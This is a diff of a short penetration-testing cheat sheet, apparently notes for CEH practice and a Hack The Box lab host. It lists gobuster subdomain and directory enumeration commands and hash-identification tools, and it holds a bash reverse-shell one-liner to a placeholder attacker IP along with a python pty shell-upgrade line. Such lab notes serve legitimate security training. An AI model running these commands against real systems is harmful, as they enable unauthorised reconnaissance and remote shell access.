@@ -9,7 +9,9 @@ https://github.com/hunterxxx/CEH-v12-Practical
 sudo apt install seclists
 gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
 gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
+gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
 
 hashid
 hash-identifier
 bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
+python3 -c 'import pty;pty.spawn("/bin/bash")'
